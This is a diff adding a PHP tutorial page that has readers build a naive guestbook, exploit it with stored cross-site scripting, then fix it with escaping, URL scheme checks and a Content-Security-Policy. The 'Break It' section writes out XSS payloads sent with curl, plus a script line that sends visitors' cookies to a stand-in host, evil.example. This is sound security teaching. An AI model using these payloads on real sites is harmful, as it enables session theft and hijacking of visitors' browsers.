@@ -1,0 +1,227 @@
+<layout name="default" title="Guestbook" />
+<page-head>
+    <meta
+        name="description"
+        content="A guestbook, the classic first app that keeps what visitors type and shows it to everyone else. Build it naive, sign it with a script that runs in every visitor's browser, then fix it: escape on the way out, only link real web addresses, and add a Content-Security-Policy. A project in Web Nerdism w/ PHP 101."
+    />
+    <meta
+        name="keywords"
+        content="PHP guestbook, stored XSS, cross-site scripting, htmlspecialchars, escaping output, javascript: URL, Content-Security-Policy, nl2br, rel ugc, never trust input, learn PHP"
+    />
+    <meta
+        property="og:description"
+        content="A guestbook, and the script someone signs it with. A project in Web Nerdism w/ PHP 101."
+    />
+</page-head>
+<article>
+    <spaced>
+        <p class="text-sm"><lnk to="/php">Web Nerdism w/ PHP 101</lnk> &rsaquo; Projects</p>
+        <heading h1 id="guestbook">Guestbook</heading>
+        <byline date="Nov 2026">Phillip Harrington</byline>
+
+        <!-- Intro -->
+        <p>
+            Before comments and social media, personal sites had guestbooks: a form at the bottom
+            where visitors left their name, their website and a line or two, and a list of everyone
+            who'd signed. It's the simplest app there is that keeps what strangers type and shows it
+            to other strangers, which makes it the simplest place to learn what happens when that
+            text is HTML.
+        </p>
+        <p>
+            You'll build it naive, sign it with a script that runs in the browser of everyone who
+            visits after you, then fix it the way every page that shows input has to be fixed.
+        </p>
+
+        <!-- What you'll use -->
+        <heading h2 id="what-youll-use">What You'll Use</heading>
+        <list>
+            <li>
+                <lnk to="/php/xss">XSS and Escaping Output</lnk>: the lesson this project acts out.
+            </li>
+            <li>
+                <lnk to="/php/never-trust-input">Never Trust Input</lnk>: what's stored is still
+                input when it comes back out.
+            </li>
+            <li>
+                <lnk to="/php/working-with-files">Working with Files</lnk> and
+                <lnk to="/php/json">JSON</lnk>: one entry per line.
+            </li>
+            <li>
+                <lnk to="/php/security-headers">Security Headers</lnk>:
+                <cde>Content-Security-Policy</cde>.
+            </li>
+        </list>
+
+        <!-- Build it -->
+        <heading h2 id="build-it">Build It</heading>
+
+        <heading h3 id="the-storage">The Storage</heading>
+        <p>
+            Entries go in a file, one JSON object per line, outside <cde>public</cde>. A new project
+            folder gets a <cde>.gitignore</cde> so the entries stay out of git:
+        </p>
+        <code-block example="project-guestbook/.gitignore" />
+        <p><cde>src/Guestbook.php</cde> adds entries and reads the latest ones back:</p>
+        <code-block example="project-guestbook/src/Guestbook.php" />
+        <p>
+            <cde>LOCK_EX</cde> keeps two people signing at the same moment from writing over each
+            other. And notice what it doesn't do: it stores exactly what was typed. That's
+            deliberate. The same text might end up in a page, an email, a CSV file or a JSON API,
+            and each one needs different escaping. So you store the original and escape it on the
+            way out, for wherever it's going.
+        </p>
+
+        <heading h3 id="the-naive-page">The Naive Page</heading>
+        <p>Build the naive guestbook as <cde>public/naive.php</cde>:</p>
+        <code-block example="project-guestbook/public/naive.php" />
+        <!-- prettier-ignore -->
+        <code-block>docker run --rm -it -p 8000:8000 -v "$PWD":/app -w /app php:8.4-cli php -S 0.0.0.0:8000 -t public</code-block>
+        <p>
+            Open <cde>http://localhost:8000/naive.php</cde> and sign it. Your entry appears at the
+            bottom, with your name linked to your website. It works.
+        </p>
+        <p class="text-th-muted text-base">
+            New to Docker or the terminal? <lnk to="/php/tools">Tools</lnk> has the setup.
+        </p>
+
+        <!-- Break it -->
+        <heading h2 id="break-it">Break It</heading>
+        <p>Sign it again, with a message that's a script:</p>
+        <!-- prettier-ignore -->
+        <code-block>curl --data-urlencode "message=&lt;script&gt;alert('Hacked')&lt;/script&gt;" -d 'name=Mallory' http://localhost:8000/naive.php</code-block>
+        <p>
+            Reload the page in your browser. An alert box says "Hacked." Reload again: it says it
+            again. The script is stored, and the page prints it into its own HTML, so it runs for
+            every visitor, every time, until someone deletes the entry. That's stored cross-site
+            scripting, XSS.
+        </p>
+        <p>
+            An alert is the polite demonstration. The script runs as your site, with everything your
+            site's JavaScript can do. This one would send every visitor's readable cookies to the
+            attacker:
+        </p>
+        <!-- prettier-ignore -->
+        <code-block>&lt;script&gt;new Image().src = 'https://evil.example/c?' + document.cookie&lt;/script&gt;</code-block>
+        <p>
+            It could also rewrite the page, show a fake sign-in form, or make requests to your site
+            as the visitor. And you don't need a <cde>&lt;script&gt;</cde> tag at all, so blocking
+            that word gets you nothing:
+        </p>
+        <!-- prettier-ignore -->
+        <code-block>curl --data-urlencode 'message=&lt;img src=x onerror=alert(1)&gt;' -d 'name=Mallory' http://localhost:8000/naive.php</code-block>
+        <p>
+            The image fails to load, and its <cde>onerror</cde> runs. One more, through the website
+            field, which never even reaches the text of the page:
+        </p>
+        <!-- prettier-ignore -->
+        <code-block>curl --data-urlencode 'website=javascript:alert(document.cookie)' -d 'name=Click me&amp;message=hi' http://localhost:8000/naive.php</code-block>
+        <p>
+            Now "Click me" is a link that runs a script when anyone clicks it.
+            <strong>Never trust input,</strong> and that includes input that's been sitting in your
+            own storage. It came from a stranger, and it's still theirs.
+        </p>
+
+        <!-- Fix it -->
+        <heading h2 id="fix-it">Fix It</heading>
+        <p>First, two helpers in <cde>src/functions.php</cde>:</p>
+        <code-block example="project-guestbook/src/functions.php" />
+        <p>
+            <cde>e()</cde> escapes text for HTML. <cde>web_url()</cde> is for the one place escaping
+            can't help: an <cde>href</cde>. <cde>javascript:alert(1)</cde> has no <cde>&lt;</cde>,
+            <cde>&gt;</cde> or quotes in it, so escaping leaves it exactly as it was, and it still
+            runs. The only fix is to check the scheme and allow <cde>http</cde> and
+            <cde>https</cde> and nothing else.
+        </p>
+        <p>Then the fixed page, <cde>public/index.php</cde>:</p>
+        <code-block example="project-guestbook/public/index.php" />
+        <list>
+            <li>
+                <strong>Every value is escaped on the way out,</strong> with <cde>e()</cde>, in the
+                one place it meets HTML. The message goes through <cde>nl2br()</cde> after escaping,
+                never before, so line breaks become <cde>&lt;br /&gt;</cde> and nothing else does.
+            </li>
+            <li>
+                <strong>A website is only a link if it's a web address,</strong> checked when it's
+                posted and again when it's shown, because entries already in the file never went
+                through the first check.
+            </li>
+            <li>
+                <strong><cde>rel="nofollow ugc"</cde></strong> on visitors' links tells search
+                engines the link is user-generated and not your endorsement, which takes the point
+                out of signing your guestbook just for the link.
+            </li>
+            <li>
+                <strong>A Content-Security-Policy.</strong> <cde>default-src 'self'</cde> tells the
+                browser to run only scripts loaded as files from your own site, and to refuse inline
+                scripts and <cde>onerror</cde> attributes. If an escape is ever missed, the browser
+                refuses to run what slipped through. It's the seatbelt, not the brakes: escaping is
+                still the fix.
+            </li>
+        </list>
+        <p>
+            Open <cde>http://localhost:8000</cde>. It reads the very same file, every attack still
+            in it. No alert. The script, the image and the link are all there, as plain text you can
+            read, and "Click me" isn't a link. Try signing the fixed one with the
+            <cde>javascript:</cde> website: "A website has to start with http:// or https://."
+        </p>
+
+        <!-- Gotchas -->
+        <heading h2 id="gotchas">Gotchas</heading>
+        <list>
+            <li>
+                <strong>Escape for where it's going.</strong> <cde>htmlspecialchars()</cde> is for
+                HTML text and quoted attributes. Inside a <cde>&lt;script&gt;</cde> block, a URL, or
+                CSS, the rules are different. Use <cde>json_encode()</cde> for a value going into
+                JavaScript, and <cde>rawurlencode()</cde> for a piece of a URL.
+            </li>
+            <li>
+                <strong>Quote your attributes.</strong> <cde>htmlspecialchars()</cde> escapes
+                quotes, which only protects an attribute that has quotes around it.
+                <cde>&lt;a href=&lt;?= e($url) ?&gt;&gt;</cde>, unquoted, can be broken with a
+                space.
+            </li>
+            <li>
+                <strong>Escaping on the way in breaks things.</strong> Store
+                <cde>&amp;lt;b&amp;gt;</cde> in the file and you'll escape it again on the way out,
+                showing visitors <cde>&amp;amp;lt;b&amp;amp;gt;</cde>. And the same text in an email
+                or a CSV file comes out mangled. Store it as typed; escape it once, at the end.
+            </li>
+            <li>
+                <strong>Allowing "a little HTML" is a project of its own.</strong> If you want
+                visitors to use bold and links, don't write your own filter. Use an HTML sanitizer
+                library with an allow list of tags and attributes, or a simpler format like
+                Markdown, rendered safely.
+            </li>
+        </list>
+
+        <side-story title="Samy Is My Hero">
+            In October 2005, Samy Kamkar put a script in his MySpace profile that added "but most of
+            all, samy is my hero" to the profile of anyone who viewed it, and copied itself there
+            too. Every infected profile infected its visitors. In about a day, more than a million
+            profiles had it, and MySpace went offline to clean up. It's still the textbook example
+            of stored XSS spreading on its own.
+        </side-story>
+
+        <!-- $2 tip -->
+        <two-dollars title="Sign your own guestbook first">
+            <p>
+                Keep one test entry on hand,
+                <cde>&lt;b&gt;bold?&lt;/b&gt; "quotes" &amp; 'apostrophes'</cde>, and paste it into
+                every field of every form you build. If any page shows bold text, or a stray quote
+                breaks the layout, you've found a missing escape before anyone else did.
+            </p>
+        </two-dollars>
+
+        <p>
+            The guestbook remembers everyone together. The next project remembers each visitor
+            separately, on the server, where they can't change it. Next: sessions.
+        </p>
+
+        <!-- Next -->
+        <hr />
+        <nav aria-label="Lesson" class="flex justify-between gap-4 text-sm">
+            <lnk to="/php">&larr; Web Nerdism w/ PHP 101</lnk>
+            <lnk to="/php/projects/sessions">Next: Sessions &rarr;</lnk>
+        </nav>
+    </spaced>
+</article>
